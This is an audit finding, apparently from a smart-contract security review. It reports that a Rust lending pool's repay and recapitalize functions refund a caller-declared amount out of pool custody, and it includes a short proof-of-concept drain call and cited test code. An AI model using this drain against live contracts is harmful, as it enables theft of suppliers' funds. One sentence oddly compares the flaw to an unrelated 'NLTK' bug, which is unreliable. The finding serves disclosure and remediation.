### Title
Unprivileged pool custody drain via unvalidated declared-amount refunds in `repay`/`recapitalize` - (File: contracts/pool/src/ops/repay.rs)

### Summary
The pool's `repay` and `recapitalize` ops compute a refund/overpayment from the **declared** `amount` argument — not from a measured inbound balance delta — and pay it straight out of pool custody via `Cache::transfer_out` without debiting `cash` or passing `require_reserves`. An unprivileged caller can declare an arbitrary `amount` against a market with zero debt or zero backing shortfall, transfer nothing in, and receive the entire declared amount from the pool's real token balance. This mirrors the NLTK bug class exactly: a value that should have been constrained by a validation layer (measured receipt / reserve checks, analogous to `pathsec`) bypasses it entirely on the refund path.

### Finding Description
`repay::accounting` resolves `resolve_repay(amount, position)` against the position's debt; when the position (or market) has no debt, `current_debt_ceil` is zero, the full-close branch makes `overpayment == amount`, `net_repay == 0`, and the `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct [1](#0-0) . `repay::apply` then calls `cache.transfer_out(payer, overpayment)`, paying the declared amount out of custody [2](#0-1) .

`recapitalize::accounting` credits only `min(amount, backing_shortfall)` to `cash`, so on a market with no shortfall `applied == 0` and `refund == amount`; `apply` transfers the full `amount` to the attacker-chosen `payer` [3](#0-2) [4](#0-3) .

The pool assumes "the controller transfers `amount` into the pool before this call" [5](#0-4) , but these are public pool entrypoints the test suite calls directly with no auth and no inbound transfer, and the protocol's own tests confirm custody is drained:

- `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody`: `recapitalize(hub, payer, custody)` takes the pool balance to zero while `payer` receives the funds and the `cash` book still shows the deposit [6](#0-5) .
- `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody`: `repay(payer, amount = custody)` on a debt-free market credits `actual_amount == 0` yet drains custody through the refund [7](#0-6) .

Because `recapitalize` is in the allowed unprivileged entrypoint list and `repay`'s pool leg is callable directly (the pool performs no payer `require_auth` for a pure-refund call — nothing is transferred in), a single unprivileged address reaches both paths.

### Impact Explanation
**Theft of user funds / permanent freezing of funds.** `recapitalize(hub_asset, attacker, pool_token_balance)` on any market with `backing_shortfall == 0` refunds the entire declared amount out of live custody. Suppliers' exits then fail inside the SAC transfer (error `BalanceError = 10`) rather than at any pool guard — the book reports solvent while custody is gone, so the loss falls on suppliers whose withdrawals can no longer be paid [8](#0-7) .

### Likelihood Explanation
Trivially reachable: one transaction, one entrypoint, a self-chosen `payer`, and a `amount` no larger than the pool's token balance. No position, collateral, oracle, or authorization is needed, and the asset-substitution check (`key.asset == params.asset_id`) only ensures the drain pays out in the real market token [9](#0-8) . The only bound is live custody, which a first-mover attacker captures in full.

### Recommendation
Measure the inbound transfer like the supply/repay receipt paths do: compute `received = balance_after − balance_before` of the market token for the payer→pool leg inside `repay::apply`/`recapitalize::apply` (or have the controller pass the measured value), and clamp `refund`/`overpayment` to `received`, never to the declared `amount`. Alternatively, require `payer.require_auth()` plus an explicit `token.transfer(payer → pool, amount)` inside the pool op so an unfunded call reverts at the transfer, and route all outbound legs through a custody/cash consistency check.

### Proof of Concept
Direct pool call (as in the existing tests):

```rust
// Market for `asset` in hub 0 has zero debt / zero shortfall.
let custody = token.balance(&pool);
// No transfer in. Pool refunds the entire declared amount.
pool.recapitalize(&hub_asset(asset), &attacker, &custody);
assert_eq!(token.balance(&pool), 0);
// Equivalent: pool.repay(&attacker, &PoolAction{ amount: custody, .. })
// on a position with zero debt -> overpayment == custody.
```

### Citations

**File:** contracts/pool/src/ops/repay.rs (L30-33)
```rust
    let outcome = accounting(env, action);

    outcome.cache.transfer_out(payer, outcome.overpayment);
    (outcome.mutation, outcome.snapshot)
```

**File:** contracts/pool/src/ops/repay.rs (L44-52)
```rust
    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );
```

**File:** contracts/pool/src/ops/recapitalize.rs (L3-4)
```rust
//! Only the shortfall amount is applied; any excess is refunded to the payer.
//! The controller transfers `amount` into the pool before this call.
```

**File:** contracts/pool/src/ops/recapitalize.rs (L32-35)
```rust
    let outcome = accounting(env, hub_asset, amount);

    outcome.cache.transfer_out(&payer, outcome.refund);

```

**File:** contracts/pool/src/ops/recapitalize.rs (L52-58)
```rust
    let applied = amount.min(guards::backing_shortfall(&cache));
    let refund = amount
        .checked_sub(applied)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    cache.credit_cash(applied);
    cache.commit();
```

**File:** contracts/pool/tests/flows.rs (L3430-3439)
```rust
    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );
```

**File:** contracts/pool/tests/flows.rs (L3441-3477)
```rust
    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
```

**File:** contracts/pool/tests/flows.rs (L3561-3575)
```rust
    // The structural half: the market's key and its configured asset are the
    // same address, which is what makes the substitution unreachable.
    t.env.as_contract(&t.pool, || {
        let key = hub(&t.asset);
        let params: MarketParamsRaw = t
            .env
            .storage()
            .persistent()
            .get(&PoolKey::Params(key.clone()))
            .expect("market must exist");
        assert_eq!(
            params.asset_id, key.asset,
            "the market key's asset and params.asset_id must be the same token"
        );
    });
```

**File:** contracts/pool/tests/flows.rs (L3590-3610)
```rust
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
```
